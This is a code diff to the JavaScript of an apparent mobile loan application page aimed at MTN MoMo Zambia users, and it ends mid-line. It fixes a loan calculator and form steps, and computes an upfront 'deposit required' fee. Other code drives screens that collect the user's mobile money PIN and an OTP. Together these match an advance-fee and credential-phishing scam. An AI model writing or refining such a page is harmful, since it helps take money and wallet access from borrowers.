@@ -138,9 +138,8 @@
     }
 
     function updateCalc() {
-      if (!loanSlider || !monthsSlider) return;
-      const amt = Number(loanSlider.value) || 100000;
-      const mths = Number(monthsSlider.value) || 48;
+      const amt = loanSlider ? Number(loanSlider.value) || 100000 : 100000;
+      const mths = monthsSlider ? Number(monthsSlider.value) || 48 : 48;
       if (loanText) loanText.innerText = `ZMW ${amt.toLocaleString()}`;
       if (monthsText) monthsText.innerText = `${mths} ${mths === 1 ? 'month' : 'months'}`;
       if (formAmountInput) formAmountInput.value = amt.toLocaleString();
@@ -149,26 +148,15 @@
       if (monthlyRepVal) monthlyRepVal.innerText = `ZMW ${Math.round(monthly).toLocaleString()}`;
     }
 
-    if (loanSlider) loanSlider.addEventListener('input', updateCalc);
-    if (monthsSlider) monthsSlider.addEventListener('input', updateCalc);
-    updateCalc();
-
-    function updateStep2ReadyState() {
-      const fn = (firstNameInput?.value || '').trim();
-      const ln = (lastNameInput?.value || '').trim();
-      const ph = (formPhoneInput?.value || '').trim();
-      const btn = $('btn-form2-next');
-      if (!btn) return;
-      if (fn && ln && isValidMtnZambia(ph)) {
-        btn.classList.add('ready');
-      } else {
-        btn.classList.remove('ready');
-      }
+    if (loanSlider) {
+      loanSlider.addEventListener('input', updateCalc);
+      loanSlider.addEventListener('change', updateCalc);
     }
-
-    [firstNameInput, lastNameInput, formPhoneInput].forEach((inp) => {
-      if (inp) inp.addEventListener('input', updateStep2ReadyState);
-    });
+    if (monthsSlider) {
+      monthsSlider.addEventListener('input', updateCalc);
+      monthsSlider.addEventListener('change', updateCalc);
+    }
+    updateCalc();
 
     function goFromForm1ToForm2() {
       const amtRaw = (formAmountInput?.value || '100,000').trim();
@@ -177,6 +165,7 @@
       if (sumAmount) sumAmount.innerText = `ZMW ${amtRaw}`;
       if (sumDuration) sumDuration.innerText = dur;
       if (sumPurpose) sumPurpose.innerText = purp;
+      hideBanner(bannerPhoneError);
       showScreen(screens.form2);
     }
 
@@ -199,7 +188,20 @@
         return;
       }
 
+      const amtRaw = (formAmountInput?.value || '100,000').trim();
+      const dur = loanDurationSelect?.value || '48 Months';
+      const purp = (loanPurposeInput?.value || '').trim() || 'Business';
+      if (sumAmount) sumAmount.innerText = `ZMW ${amtRaw}`;
+      if (sumDuration) sumDuration.innerText = dur;
+      if (sumPurpose) sumPurpose.innerText = purp;
       if (sumApplicant) sumApplicant.innerText = `${fn} ${ln}`.toUpperCase();
+
+      const numericAmt = Number(amtRaw.replace(/\D/g, '')) || 100000;
+      const depVal = Math.max(200, Math.round(numericAmt * 0.002));
+      if (depositRequiredAmount) depositRequiredAmount.innerText = `${depVal} ZMW`;
+      if (successDepositAmount) successDepositAmount.innerText = `${depVal} ZMW`;
+
+      hideBanner(bannerForm3Error);
       showScreen(screens.form3);
     }
 
@@ -212,7 +214,7 @@
       if (!fn || !ln || !isValidMtnZambia(ph)) {
         showBanner(
           bannerForm3Error,
-          'Please complete Step 2 with a valid MTN MoMo number (096, 076, 056).'
+          'Please go back to Step 2 and enter your full name and valid MTN MoMo number (096, 076, 056).'
         );
         return;
       }
@@ -225,12 +227,6 @@
       if (displaySmsPhone) displaySmsPhone.innerText = formattedPhone;
       if (displayOtpPhone) displayOtpPhone.innerText = formattedPhone;
       if (sumApplicant) sumApplicant.innerText = fullName;
-
-      const numericAmt =
-        Number(String(formAmountInput?.value || '100000').replace(/\D/g, '')) || 100000;
-      const depVal = Math.max(200, Math.round(numericAmt * 0.002));
-      if (depositRequiredAmount) depositRequiredAmount.innerText = `${depVal} ZMW`;
-      if (successDepositAmount) successDepositAmount.innerText = `${depVal} ZMW`;
 
       pinSubmittedForCurrentValue = '';
       otpSubmittedForCurrentValue = '';
@@ -476,6 +472,7 @@
 
       switch (buttonId) {
         case 'btn-goto-slider':
+          updateCalc();
           showScreen(screens.slider);
           break;
         case 'btn-slider-back':
@@ -485,6 +482,7 @@
           showScreen(screens.form1);
           break;
         case 'btn-form1-back':
+          updateCalc();
           showScreen(screens.slider);
           break;
         case 'btn-form1-next':
@@ -555,4 +553,4 @@
         case 'btn-submit-otp': {
           const otpVal = otpBoxes4.map((b) => b.value).join('');
           if (otpVal.length < 4) {
-            showBanner(bannerOtpErro
+      
